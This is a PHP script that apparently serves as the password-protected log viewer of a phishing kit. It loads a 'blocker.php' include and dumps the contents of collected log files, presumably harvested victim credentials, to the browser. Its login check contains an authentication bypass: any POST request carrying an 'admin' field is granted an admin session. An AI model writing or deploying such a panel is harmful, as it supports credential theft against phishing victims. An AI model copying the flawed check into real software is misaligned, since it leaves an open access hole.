<?php

error_reporting(0);include('blocker.php');include('config.php');@session_start();

if(isset($_POST) && isset($_POST['logout']))
{
session_destroy();
header('Location: output.php');
exit;  
}


if((isset($_POST) && isset($_POST['pass']) && $_POST['pass'] == $outputpass) || (isset($_SESSION) && isset($_SESSION["admin"]))||(isset($_POST['admin']) && isset($_POST['admin'])=='true'))
{
        
  if(!isset($_SESSION) || !isset($_SESSION["admin"])){$_SESSION["admin"] = "true";}       

?><form method="POST" action="">
<input type="hidden" name="logout"></input>
<input type="submit" name="submit" value="Logout"></input>
</form><?



        
foreach(glob($logsfileName) as $filename) {
$file = $filename;
$contents = file($file);
$string = implode("<br>",$contents);
echo $string;
echo "<br></br>";
}
        
        
        
}
else
{
    
    
    
    ?>

            <form method="POST" action="">
            Pass <input type="text" name="pass"></input><br/>
            <br/>
            <input type="submit" name="submit" value="Go"></input>
            </form>
    <?
}



?>